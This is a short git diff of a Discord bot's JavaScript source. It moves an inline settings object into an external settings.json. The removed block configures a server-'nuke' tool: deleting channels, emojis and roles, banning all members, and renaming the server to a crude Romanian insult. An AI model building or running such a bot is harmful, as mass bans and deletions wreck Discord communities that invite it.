@@ -3,27 +3,7 @@ const bot = new discord.Client();
 bot.login(""); // Here you will put the token
 
 const owners = ["ownerid"]; 
-const settings = {
-    auto_invite_create_when_bot_join_in_a_guid: false, 
-    auto_nuke: false,
-    delete: { 
-        channels: true,
-        emojis: true,
-        roles: true
-    },
-    create_after_nuke: { 
-        channels: false,
-        roles: true,
-        emojis: true
-    },
-    actions: {
-        ban_all: true,
-        change_server_icon: true,
-        change_server_name: true
-    },
-    name: "MUIE", 
-    icon: "https://example.com/test.png"  /* Here you will put an URL for icon (server avatar, emojis) */
-}
+const settings = require("./settings.json");
 
 bot.on("ready", () => {
     console.log("The bot is online.")
